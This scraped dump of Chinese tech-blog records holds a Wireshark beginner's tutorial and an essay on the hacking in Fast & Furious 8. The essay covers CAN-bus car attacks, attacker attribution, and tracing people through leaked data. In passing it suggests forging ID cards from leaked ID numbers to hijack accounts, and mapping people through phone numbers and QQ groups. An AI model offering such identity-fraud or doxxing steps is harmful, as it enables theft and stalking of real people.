target=\"_blank\" href=\"http://www.jobbole.com/members/ityouknow\">纯洁的微笑</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/ityouknow\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/02/7a2dae804fcc41edb889ce67f7973c58.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            我的微信公众号：纯洁的微笑（KeepPureSmile），欢迎大家关注。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/ityouknow\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/ityouknow/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/ityouknow/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 33</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://www.ityouknow.com/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/ityouknow\"><i class=\"fa fa-weibo\"></i></a> <a title=\"QQ：863865929\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/ityouknow\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/63918611gy1ffrw8w1u4tj20hi0a0749.jpg"], "fav_nums": 11, "comment_nums": 5, "create_date": "2017/05/20", "praise_nums": 1}
{"tags": "Kali,WireShark,IT技术,Linux", "front_image_path": "full/64ee1ddeba1354ba8ae7ca4f99ff0009ece8a349.jpg", "title": "Linux 下网络协议分析器 Wireshark 使用基础", "url_object_id": "bbc079fdcf9870763eb528189ac7c691", "url": "http://blog.jobbole.com/111051/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://linuxconfig.org/basic-of-network-protocol-analyzer-wireshark-on-linux\">Nick Congleton</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8457-1.html\">wcnnbdk1</a>   </div><div> Wireshark 是 Kali 中预置的众多有价值工具中的一种。与其它工具一样，它可以被用于正面用途，同样也可以被用于不良目的。当然，本文将会介绍如何追踪你自己的网络流量来发现潜在的非正常活动。</div>\n<p>Wireshark 相当的强大，当你第一次见到它的时候可能会被它吓到，但是它的目的始终就只有一个，那就是追踪网络流量，并且它所实现的所有选项都只为了加强它追踪流量的能力。</p>\n<h3 id=\"toc_1\">安装</h3>\n<p>Kali 中预置了 Wireshark 。不过，<code>wireshark-gtk</code> 包提供了一个更好的界面使你在使用 Wireshark 的时候会有更友好的体验。因此，在使用 Wireshark 前的第一步是安装 <code>wireshark-gtk</code> 这个包。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f101915766969284\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# apt install wireshark-gtk\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f101915766969284-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f101915766969284-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f101915766969284-1\"><span class=\"crayon-p\"># apt install wireshark-gtk</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f101915766969284-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果你的 Kali 是从 live 介质上运行的也不需要担心，依然有效。</p>\n<h3 id=\"toc_2\">基础配置</h3>\n<p>在你使用 Wireshark 之前，将它设置成你使用起来最舒适的状态可能是最好的。Wireshark 提供了许多不同的布局方案和选项来配置程序的行为。尽管数量很多，但是使用起来是相当直接明确的。</p>\n<p>从启动 Wireshark-gtk 开始。需要确定启动的是 GTK 版本的。在 Kali 中它们是被分别列出的。</p>\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/28/023000gt7itb6djtth7eqq.jpg\" alt=\"Wireshark running on Kali\"></p>\n<h3 id=\"toc_3\">布局</h3>\n<p>默认情况下，Wireshark 的信息展示分为三块内容，每一块都叠在另一块上方。（LCTT 译注：这里的三部分指的是展示抓包信息的时候的那三块内容，本段配图没有展示，配图 4、5、6 的设置不是默认设置，与这里的描述不符）最上方的一块是所抓包的列表。中间的一块是包的详细信息。最下面那块中包含的是包的原始字节信息。通常来说，上面的两块中的信息比最下面的那块有用的多，但是对于资深用户来说这块内容仍然是重要信息。</p>\n<p>每一块都是可以缩放的，可并不是每一个人都必须使用这样叠起来的布局方式。你可以在 Wireshark 的“选项Preferences”菜单中进行更改。点击“编辑Edit”菜单，最下方就是的“选项Preferences”菜单。这个选项会打开一个有更多选项的新窗口。单击侧边菜单中“用户界面User Interface”下的“布局Layout”选项。</p>\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/28/023002awqjo54zp4r125qr.jpg\" alt=\"Wireshark's layout configuration\"></p>\n<p>你将会看到一些不同的布局方案。上方的图示可以让你选择不同的面板位置布局方案，下面的单选框可以让你选择不同面板中的数据内容。</p>\n<p>下面那个标记为“列Columns”的标签可以让你选择展示所抓取包的哪些信息。选择那些你需要的数据信息，或者全部展示。</p>\n<h3 id=\"toc_4\">工具条</h3>\n<p>对于 Wireshark 的工具条能做的设置不是太多，但是如果你想设置的话，你依然在前文中提到的“布局”菜单中的窗口管理工具下方找到一些有用的设置选项。那些能让你配置工具条和工具条中条目的选项就在窗口选项下方。</p>\n<p>你还可以在“视图View”菜单下勾选来配置工具条的显示内容。</p>\n<h3 id=\"toc_5\">功能</h3>\n<p>主要的用来控制 Wireshark 抓包的控制选项基本都集中在“捕捉Capture”菜单下的“选项Options”选项中。</p>\n<p>在开启的窗口中最上方的“捕捉Capture”部分可以让你选择 Wireshark 要监控的某个具体的网络接口。这部分可能会由于你系统的配置不同而会有相当大的不同。要记得勾选正确的选择框才能获得正确的数据。虚拟机和伴随它们一起的网络接口也同样会在这个列表里显示。同样也会有多种不同的选项对应这多种不同的网络接口。</p>\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/28/023003od9y9mmmo9dr9mym.jpg\" alt=\"Wireshark's capture configuration\"></p>\n<p>在网络接口列表的下方是两个选项。其中一个选项是全选所有的接口。另一个选项用来选择是否开启混杂模式。这个选项可以使你的计算机监控到所选网络上的所有的计算机。（LCTT 译注：混杂模式可以在 HUB 中或监听模式的交换机接口上捕获那些由于 MAC 地址非本机而会被自动丢弃的数据包）如果你想监控你所在的整个网络，这个选项是你所需要的。</p>\n<p><strong>注意:</strong> 在一个不属于你或者不拥有权限的网络上使用混杂模式来监控是非法的！</p>\n<p>在窗口下方的右侧是“显示选项Display Options”和“名称解析Name Resolution”选项块。对于“显示选项Display Options”来说，三个选项全选可能就是一个很好的选择了。当然你也可以取消选择，但是最好还是保留选择“实时更新抓包列表”。</p>\n<p>在“名称解析Name Resolution”中你也可以设置你的偏好。这里的选项会产生附加的请求因此选得越多就会有越多的请求产生使你的抓取的包列表显得杂乱。把 MAC 解析选项选上是个好主意，那样就可以知道所使用的网络硬件的品牌了。这可以帮助你来确定你是在与哪台设备上的哪个接口进行交互。</p>\n<h3 id=\"toc_6\">抓包</h3>\n<p>抓包是 Wireshark 的核心功能。监控和记录特定网络上的流量就是它最初产生的目的。使用它最基本的方式来作这个抓包的工作是相当简单方便的。当然，越多的配置和选项就越可以充分利用 Wireshark 的力量。这里的介绍的关注点依然还是它最基本的记录方式。</p>\n<p>按下那个看起来像蓝色鲨鱼鳍的新建实时抓包按钮就可以开始抓包了。（LCTT 译注：在我的 Debian 上它是绿色的）</p>\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/28/023005u1zcaegq157hze4d.jpg\" alt=\"Wireshark listing packet information\"></p>\n<p>在抓包的过程中，Wireshark 会收集所有它能收集到的包的数据并且记录下来。如果没有更改过相关设置的话，在抓包的过程中你会看见不断的有新的包进入到“包列表”面板中。你可以实时的查看你认为有趣的包，或者就让 Wireshark 运行着，同时你可以做一些其它的事情。</p>\n<p>当你完成了，按下红色的正方形“停止”按钮就可以了。现在，你可以选择是否要保存这些所抓取的数据了。要保存的话，你可以使用“文件”菜单下的“保存”或者是“另存为”选项。</p>\n<h3 id=\"toc_7\">读取数据</h3>\n<p>Wireshark 的目标是向你提供你所需要的所有数据。这样做时，它会在它监控的网络上收集大量的与网络包相关的数据。它使用可折叠的标签来展示这些数据，使得这些数据看起来没有那么吓人。每一个标签都对应于网络包中一部分的请求数据。</p>\n<p>这些标签是按照从最底层到最高层一层层堆起来的。顶部标签总是包含数据包中包含的字节数据。最下方的标签可能会是多种多样的。在下图的例子中是一个 HTTP 请求，它会包含 HTTP 的信息。您遇到的大多数数据包将是 TCP 数据，它将展示在底层的标签中。</p>\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/28/023007tjhoy3s4y4o1ytiu.jpg\" alt=\"Wireshark listing HTTP packet info\"></p>\n<p>每一个标签页都包含了抓取包中对应部分的相关数据。一个 HTTP 包可能会包含与请求类型相关的信息，如所使用的网络浏览器，服务器的 IP 地址，语言，编码方式等的数据。一个 TCP 包会包含服务器与客户端使用的端口信息和 TCP 三次握手过程中的标志位信息。</p>\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/28/023009rl3hzhyk3a8ljjdk.jpg\" alt=\"Wireshark listing TCP packet info\"></p>\n<p>在上方的其它标签中包含了一些大多数用户都感兴趣的少量信息。其中一个标签中包含了数据包是否是通过 IPv4 或者 IPv6 传输的，以及客户端和服务器端的 IP 地址。另一个标签中包含了客户端和接入因特网的路由器或网关的设备的 MAC 地址信息。</p>\n<h3 id=\"toc_8\">结语</h3>\n<p style=\"text-align: center\">即使只使用这些基础选项与配置，你依然可以发现 Wireshark 会是一个多么强大的工具。监控你的网络流量可以帮助你识别、终止网络攻击或者提升连接速度。它也可以帮你找到问题应用。下一篇 Wireshark 指南我们将会一起探索 Wireshark 的包过滤选项。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111051\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111051votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111051\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://dn-linuxcn.qbox.me/data/attachment/album/201704/28/023000gt7itb6djtth7eqq.jpg"], "fav_nums": 4, "comment_nums": 0, "create_date": "2017/05/01", "praise_nums": 1}
{"tags": "安全,IT技术", "front_image_path": "full/7e05c40245fcb12ade3bb6dfb7e71a7039b1ea92.jpg", "title": "速度与激情 8 中的信息安全技术", "url_object_id": "6bef061e7ffcc6e8a94eaa102b81f084", "url": "http://blog.jobbole.com/111029/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/26374755\">elknot（已获授权）</a>   </div><p>前言：本文中的技术仅供交流，如有疏漏还请大家批评指正</p>\n<p>14号跟女票下班之后直接去电影院看速8，当然看完速8之后并没有去速八而是直接回了家。首先对电影给个正面的评价，但是本人作为一个信息安全从业者，有必要扒一扒里面的黑客技术。</p>\n<p>里面涉及到黑客技术的东西主要有两个——天眼（The Eye）和僵尸车队（Zombie Cars）。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ff87fb6lahj20ib0a8n51.jpg\" width=\"621\" height=\"347\"></p>\n<p>对于这两个东西其实和现实当中两项比较前沿的安全技术相关——汽车及物联网安全和攻击者溯源，对于汽车安全这一部分，我的基友闹心均<a class=\"member_mention\" href=\"http://www.zhihu.com/people/99baa09c00f17fffcdd281e48ebeb5e9\" data-hash=\"99baa09c00f17fffcdd281e48ebeb5e9\" data-editable=\"true\" data-title=\"@Selfighter\" data-hovercard=\"p$b$99baa09c00f17fffcdd281e48ebeb5e9\">@Selfighter</a>是砖家中的砖家，可惜人在HITB，所以我先很业余的说一些这方面的东西。</p>\n<p>首先我们先来说说智能汽车和非智能汽车，智能汽车其实就可以当做一个物联网设备来解决，也就是说智能汽车的攻击面和其他IoT设备的攻击面是差不多甚至更多的。</p>\n<p>其实汽车和计算机一样，内部通信依靠总线进行，汽车中的总线是CAN总线。CAN网络是由以研发和生产汽车电子产品著称的德国BOSCH公司开发的，并最终成为国际标准（ISO 11898），是国际上应用最广泛的现场总线之一。CAN总线协议目前已经成为汽车计算机控制系统和嵌入式工业控制局域网的标准总线，同时也是车载ECU之间通信的主要总线。当前市场上的汽车至少拥有一个CAN网络，作为嵌入式系统之间互联的主干网进行车内信息的交互和共享。CAN总线的短帧数据结构、非破坏性总线仲裁技术、灵活的通讯方式等特点能够满足汽车实时性和可靠性的要求，但同时也带来了系列安全隐患，如广播消息易被监听，基于优先级的仲裁机制易遭受攻击，无源地址域和无认证域无法区分消息来源等问题。特别是在汽车网联化大力发展的背景下，车内网络攻击更是成为汽车信息安全问题发生的源头，CAN总线网络安全分析逐渐成为行业安全专家聚焦点。如2013年9月DEFCON黑客大会上，黑客演示了从OBD-II控制福特翼虎、丰田普锐斯两款车型实现方向盘转向、刹车制动、油门加速、仪表盘显示等动作。汽车车内CAN网络安全问题当前主要通过安全漏洞的分析和各种攻击手段进行挖掘，因为汽车车内网络安全的脆弱性和威胁模型的分析尤为关键。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ff87fenipwj20gn09aqb3.jpg\"></p>\n<p>这么说来，只要抓住了CAN总线，我们就相当于是抓住了汽车的神经，也就能对汽车进行控制，那么攻击CAN总线会引发什么后果呢？</p>\n<p>第一个后果是失控：CAN总线主要应用之一是支持主动安全系统的通信，道路车辆行驶的时候，主动安全系统将是一把双刃剑，在它们发挥着不可替代的功能时候，但是考虑到主动安全系统的可操作和有能力调整正确的输入，也会引起驾驶者对主动安全系统的完全依赖。因此一个突然的故障会引起不可预知的危险后果。为了引发一个危险的条件，恶意的攻击者将会在CAN总线中注入错误帧，让主动安全系统失灵。例如，在牵引力控制系统里安装一个攻击，会造成车辆失去控制等危险。如果攻击者的目标是自适应巡航系统，将会导致汽车不会安驾驶者预期的那样停止。此外，为了最大可能的伤害汽车驾驶者，假如数据可以直接从CAN总线上获取，攻击者可以根据特定的条件，触发一个DoS攻击。例如汽车某一特定速度，特定的节气门百分比或者是某一确切的GPS位置等。</p>\n<p>第二个后果就是勒索：一个恶意的攻击者将在CAN总线中某一目标帧中设置攻击，这将会导致驾驶者无法控制节气门的位置从而不能让汽车移动。尽管这些不会必定发生危险状态，一个以金钱为目的的攻击者，将会利用车载娱乐系统的漏洞，停止汽车，并在娱乐系统屏幕上显示消息，车主为了重新获取汽车的操控权而去付赎金。</p>\n<p>第三个可能是盗窃：大部分现代昂贵的汽车门锁通过CAN连接到ECU来控制，通常通过OBD-II端口可连接。隔离负责控制锁/解锁车门的数据帧比逆向主动安全设备更简单、更快捷。因此，几分钟左右一个攻击者将会隔离负责锁车门的数据帧，编写他的设备程序-特定帧的DoS攻击，然后把设备插入到OBD-II的接口，阻止车门锁住。对于一个攻击者来说，这个攻击结果是可能的。通过低成本的花费就能进入到车内，随后就能够窃取车内任何贵重物品。</p>\n<p>长期以来，几乎整个汽车界都有这样的共识：<strong>CAN总线是没法保护的。两方面的原因，其一，ECU的计算处理能力不足；其二，车载网络的带宽有限</strong>。有些LIN总线使用的MCU甚至是16bit或8bit，但AES使用的加密算法只能处理16字节区块的数据，这意味着很多时候LIN总线根本就是处在“裸奔”的状态。所以汽车安全未来肯定是炙手可热的一部分。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ff87hmv482j20fr08vjrq.jpg\"></p>\n<p>接下来我们说说天眼，其实天眼的目标很简单——我知道一个人的一部分信息，如何根据一部分信息去拼凑出一个完整的信息，比如他去过什么地方，干过什么事情，目的是什么，用了什么东西，也就是广义上的了解你的敌人。对于安全工作者来说，转化到现实当中的问题就是甲方安全团队在找到攻击者之后如何让攻击者不再攻击你？单单从防御的角度上来说，我们可以上规则、上设备，但是这样并不能从根本上解决问题。继续说回电影，其实《赤道》中香港、韩国两方面只希望把武器送走，确保不在香港交易同时回到韩国，这样就解决了这个问题。但是宋总不是这么想，宋总站在了更高的角度上，他不希望把香港变成真正的地下武器贩卖中心，也就是要把地下武器交易这个链条彻底打碎。从解决问题的角度上来看这两者都没错。</p>\n<p>回到正题，对于攻击者来说，攻击者一旦发起攻击就会在目标系统中产生数据，不管有用也好无用也罢，总之数据都会产生，诸如流量数据、操作日志、爆破记录、工具指纹、网络地址等信息。</p>\n<p>Phase 1：从日志分析的角度上来讲，既然我们有这么多的设备，有这么多的日志，我们要做的就是把这些想关的攻击向量和行为日志收集起来，统一到一起，看看有什么线索。</p>\n<p>Phase 2：既然我们已经收集到了很多的日志和数据，那么我们可以从日志中把这些信息拼凑成一个完整的攻击行为记录：即它是通过什么漏洞进来的，如何进来的，进来之后做了什么，对系统有什么影响。完完全全使之成为一个攻击的模型，这样的话也就完成了对入侵的推演。</p>\n<p>Phase 3：我们既然知道了他是如何进来了的，从甲方安全运营的角度来讲，我们需要确认其他机器当中是否有相同的漏洞和配置错误，要避免其它的人利用相同的方法入侵系统，毕竟不能在一个坑栽倒两次。</p>\n<p>Phase 4：我们现在有了攻击者的一些信息，我们是否可以通过外部威胁情报数据来看看这个攻击者是不是之前攻击过其他系统，攻击是不是有针对性，工具用的是进口的、国产的还是自己写的，是不是有其他的同伙或者帮手，他到底是怀揣着什么目的去攻击我们的系统。</p>\n<p>Phase 5：如果我们确定他的身份是恶意的，并且对我们的系统造成了很严重的影响，我们是不是应该知道这个人是什么来头，他的个人信息（虚拟身份和真实身份）我们是不是要了解，我们是不是应该去用法律手段搞他，等等。</p>\n<p>其实攻击溯源，其实是数据驱动的企业内部安全运营的一部分，需要大量数据的支撑以及分析才能找到攻击者，而企业内部我们见到最多的数据无非就是日志了，所以日志的分析和内网威胁情报的提取是非常重要的一环。</p>\n<p>针对安全运营来说，我个人认为所有的攻击者不可避免的都会产生操作日志，针对内网内的安全设备也好，非安全设备也好，肯定或多或少的存在日志。</p>\n<p>针对企业内部的日志，大体上可分为四类：安全设备日志、非安全设备日志、传感器日志和外部数据。</p>\n<p>对于追踪来说一般有这么三种套路：</p>\n<p>IP-＞域名-＞Whois信息-＞社交网络信息-&gt;真实信息：这个套路对于现在来说可能用处不是特别大，但是根据历史Whois信息也是可以得出一些启发性的结论的，当然这些威胁情报数据可能付费。</p>\n<p>IP-＞VPN-＞IP-&gt;社交网络信息：这种情况一般是大多数，解决方法是通过查询IP反连记录，解析操作和一些fingerprint获得他的虚拟身份信息，当然也是要收费的</p>\n<p>IP-&gt;botnet-＞IP-&gt;社交网络信息：这种广泛分布于挖矿、刷票、DDoS这种肉鸡类型的，可以想办法截获起botnet样本进行逆向分析，获取其c&amp;c服务器地址，然后对服务器进行反连查询。没错还是要收费的。</p>\n<p>安全设备日志：这些日志来源可以是硬件也可以是软件，首先就硬件来说注入IDS/WAF或者SIEM中的日志、硬件防火墙等等日志，软件日志包括防病毒软件、安全Agent、准入系统等软件系统的日志。这些日志一般都是攻击者进行攻击时会进行被动触发，这样的话可以检索到很多攻击信息，诸如使用的IP、端口、工具指纹等等。</p>\n<p>非安全设备日志：诸如路由器、交换机、网关、网闸等硬件设备以及操作系统、应用软件、服务器软件日志等软件日志，这些日志中可以分析出攻击者的目的，是为了单纯渗透玩一下还是想要通过控制机器作为跳板机进行进一步的渗透工作，还是说仅仅是安全部门进行扫描产生的日志。</p>\n<p>传感器日志：企业内部通常会部署一些蜜罐系统、流量传感器等，这些设备一方面可以有攻击预警和反横向渗透的效果，但是里面也会存在一些攻击者的行为，比如SSH蜜罐会存下攻击者在这台机器上的操作，流量传感器会对数据包进行DPI解析方便流量分析，这些数据中肯定残存着一些有用的信息可以帮助我们确定攻击者的行为、技能点，甚至可以进一步判断该攻击者的能力，是脚本小子还是大黑阔。</p>\n<p>外部日志：一些常用服务的日志，比如说邮件、DNS等日常服务的日志，这些日志可以帮我们确定攻击者是否是一种APT攻击，或者是是否是来种植Botnet的。同样可以确定攻击者的动机。</p>\n<p>说完了日志，我们紧接着可以说一下攻击者的动机判定，攻击者想要入侵一个系统肯定会对这个系统进行侦查，诸如端口扫描、脆弱性检测、exp测试等手段，这里面很容易和安全部门的安全常规巡检的日志起冲突，大多数公司都会把扫描机群放到白名单里。这样产生了类似的日志就会触发报警，我们可以进一步分析这些日志提取出一些攻击者的行为、动机等等，以及他的目的甚至他的技能点，我们都可以初步判断。</p>\n<p>通过对以上日志的分析，我们可以基本上确定攻击者是什么途径进来的，用何种攻击方式拿到机器权限，有没有执行什么敏感的操作，是否有进一步渗透的趋势，是不是在尝试提权之类的操作等等，这样我们就对攻击者有一个大概的了解。</p>\n<p>接下来我们就需要借助外部威胁情报的力量来获取攻击者的身份，我个人比较喜欢国内的微步在线和国外的PassiveTotal这两个平台，尤其是后者，数据比较全而且覆盖度很广。当然不差钱的各位可以选择去买威胁情报服务，更专业。</p>\n<p>简单说一下威胁情报可以帮我们干什么，威胁情报其实就是根据上面获得残破的攻击者画像变得完整，威胁情报一般可以获得这个攻击者有哪些常用的IP，这些IP分别都是干什么的，有没有什么社交信息，社交信息又有什么关联。举个不恰当的例子就是相当于你知道一个人的身份证号，然后警察用这个身份证号去查这个人有多少钱，资产有多少等等。这样你就可以获得一个较为完整的攻击者画像。</p>\n<p>到了这里其实我们知道了攻击者的信息，就可以选择怎么解决，拉倒办公室弹jj10分钟是一个解决方案，扭送到警察蜀黍那里也是解决方案，但是需要提醒大家注意执法力度和执法手段，不要知法犯法（逃。</p>\n<p>说到以上大家会觉得我偏题了，你娃不是说要讲天眼么，怎么扯了一大堆安全运营上的事儿，这跟天眼有什么关系。那么接下来的事情就和天眼有关系了：</p>\n<p>在电影中，飞车家族只需要输入一个名字就可以去找到这个人，确定他的位置，然后上门送温暖喝热茶。但是现实当中，重名的你懂得，所以我们现在从其他的地方下手：</p>\n<p>Part 1：长相，这里无非就是涉及到人脸识别技术，没什么好说的（其实是我不懂）</p>\n<p>Part 2：身份证号码，这个就比较重要了，身份证号码对于广大人民群众来说，变的机会基本为0，很多企业不管是干什么的也好都喜欢玩实名制，尤其是一些小的金融公司和P2P公司，总喜欢没事问你身份证号。鉴于我国信息泄露这个问题还是挺严重的，所以我们不能保证别人没有我们的身份证号。我们来说有了身份证号能干什么：先来造一张假的身份证，然后利用这张身份证（照片或者扫描件）去搞一些不需要实体身份证的东西，比如你懂得。这样我们就能把这个人的一些账户劫持了，能干啥你现在应该明白了。</p>\n<p>Part 3：手机号码，一般我们通信都用手机号码，手机号码泄露更是屡见不鲜，和身份证号一样，许多企业都是动不动就跟你要。手机号码泄露更是一件蛋疼的事情，骚扰电话短信不说，由于现在很多手机号码和业务是绑定的，也就是用手机号码就可以登录相关的业务，这样的话手机号码的泄露很有可能就会联系到相对应的身份，举个最简单的例子：手机号码绑定QQ号码，然后QQ号码可以查询群关系，之后通过群关系能搞出很多信息，后果你懂的</p>\n<p>Part 4：QQ号码，其实上面已经说了，QQ号码相当于虚拟版本的身份证号，很多东西都和QQ有关系，比如iCloud账号、游戏账号、甚至是一些信用卡账单啊什么的绑定的邮箱都是QQ的。QQ号码能查的东西那就太多了，上面就是个例子。</p>\n<p>Part 5：电子邮箱，这个在国内似乎用的比较少，但是企业内部的电子邮箱是讨论的重点，企业内部电子邮箱是很多攻击者最喜欢的地方，因为可以以此为突破口获取企业内部的一些信息。当年在甲方做安全运营的时候经常收到各种同时转发过来的钓鱼邮件，就是用来骗取Exchange邮箱账户的，这些对企业内部安全构成了严重的威胁。</p>\n<p>补充：有个网站可以查到某个邮箱/手机号注册了什么网站。。。。。</p>\n<p>所以，天眼的实现基础，其实是背后的数据在做支撑，数据，其实就是泄露的数据，民间收集的数据来源主要还是各大数据库泄露的SQL文件等，当然不排除有些万恶的黑产玩无间道，此处有句xxx我一定要讲。</p>\n<p>其实《速度与激情8》里面的黑客技术就现在看来是可以完全实现的，只是实现的成本有高有低，但是搞攻防的话，一定要站在攻击成本的角度上去考虑，安全无绝对，所以大家也没有必要为这些事情担心，安全研究院和厂商之间的互动越来越多也从侧面证明了现在大家对安全的重视，作为安全工作者，我们也非常愿意帮助厂商做好安全这一部分。先说这么多吧，此文仅作为科普，如需讨论细节还请回复或者发私信。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111029\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111029votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111029\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": 